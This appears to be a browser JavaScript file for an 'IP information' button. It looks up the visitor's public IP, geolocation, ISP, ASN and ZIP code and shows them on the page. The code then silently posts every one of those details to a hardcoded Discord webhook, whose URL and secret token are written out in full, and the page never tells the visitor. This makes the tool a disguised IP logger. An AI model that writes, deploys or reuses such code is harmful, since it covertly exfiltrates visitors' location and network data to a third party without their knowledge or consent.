document.getElementById('getIpInfo').addEventListener('click', function() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // Fetch IP information from ip-api.com
            fetch(`http://ip-api.com/json/${ipAddress}`)
                .then(response => response.json())
                .then(data => {
                    const ipInfo = {
                        "IP Address": data.query || 'N/A',
                        "Hostname": data.reverse || 'N/A',
                        "City": data.city || 'N/A',
                        "Region": data.regionName || 'N/A',
                        "Country": data.country || 'N/A',
                        "Location": `${data.lat || 'N/A'}, ${data.lon || 'N/A'}`,
                        "ISP": data.isp || 'N/A',
                        "Organization": data.org || 'N/A',
                        "ASN": data.as || 'N/A',
                        "ZIP Code": data.zip || 'N/A',
                        "Timezone": data.timezone || 'N/A',
                        "Calling Code": `+${data.countryCode || 'N/A'}`,
                        "Currency": data.currency || 'N/A',
                        "Languages": data.lang || 'N/A',
                        "Reverse": data.reverse || 'N/A',
                        "Hosting": data.proxy || 'N/A'
                        // Add more fields as ip-api.com provides them
                    };

                    // Display IP information on the page
                    const ipInfoContainer = document.getElementById('ipInfo');
                    ipInfoContainer.innerHTML = '';

                    const card = document.createElement('div');
                    card.classList.add('card', 'col-12');

                    const cardContent = document.createElement('div');
                    cardContent.classList.add('card-body');

                    const cardTitle = document.createElement('h5');
                    cardTitle.classList.add('card-title');
                    cardTitle.textContent = 'IP Information';

                    cardContent.appendChild(cardTitle);

                    for (const [key, value] of Object.entries(ipInfo)) {
                        const infoItem = document.createElement('p');
                        infoItem.classList.add('info-item');
                        infoItem.textContent = `${key}: ${value}`;
                        cardContent.appendChild(infoItem);
                    }

                    card.appendChild(cardContent);
                    ipInfoContainer.appendChild(card);

                    ipInfoContainer.classList.remove('hidden');

                    // Sending data to Discord webhook
                    const webhookUrl = 'https://discord.com/api/webhooks/1263106837532901518/3cezamhuVGtK3hQTYC8l1MAgeetYrNl08wfddJrKW6JGrYGuaWiJ7s6xKXuoghUHOx6O';
                    const payload = {
                        content: `\`\`\`${Object.entries(ipInfo).map(([key, value]) => `${key}: ${value}`).join('\n')}\`\`\``
                    };

                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Successfully sent to Discord');
                        } else {
                            console.error('Error sending to Discord');
                        }
                    })
                    .catch(error => console.error('Error:', error));
                })
                .catch(error => {
                    console.error('Error fetching IP information from ip-api.com:', error);
                    alert('Error fetching IP information from ip-api.com');
                });
        })
        .catch(error => {
            console.error('Error fetching IP address from api.ipify.org:', error);
            alert('Error fetching IP address');
        });
});
